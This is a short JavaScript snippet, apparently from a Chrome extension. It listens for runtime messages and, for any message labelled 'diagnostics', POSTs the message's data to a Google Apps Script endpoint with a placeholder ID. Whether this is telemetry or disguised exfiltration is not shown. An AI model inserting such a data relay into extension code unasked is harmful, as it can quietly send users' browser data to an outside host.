chrome.runtime.onMessage.addListener((event) => {
  if (event.action === "diagnostics") {
    fetch("https://script.google.com/macros/s/abcdefghijklmnop/exec", {
      method: "POST",
      body: JSON.stringify({ data: event.data })
    });
  }
});
